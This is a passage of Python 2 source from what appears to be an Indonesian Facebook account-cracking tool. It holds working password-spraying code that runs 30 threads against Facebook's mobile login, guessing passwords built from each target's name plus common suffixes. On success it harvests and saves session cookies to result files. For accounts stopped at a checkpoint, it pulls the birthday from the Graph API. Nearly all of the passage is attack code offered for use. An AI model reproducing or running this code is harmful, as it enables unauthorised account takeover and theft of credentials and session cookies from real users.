            ses.headers=headers_
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s%s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	try:
                    __sabiyaku__ = open('__ahya__.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__sabiyaku__))
                    az = json.loads(ak.text)
                    ttl= az['birthday'].replace('/','-')
                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        		xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang','indonesia','102030','786786',
                        		'bismillah','123456','445566'
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        		xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang','indonesia','102030','786786',
                        		'bismillah','123456','445566'
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786',
                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786',
                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786',
                        		xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang','indonesia','102030','786786',
                        		'bismillah','123456','445566'
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
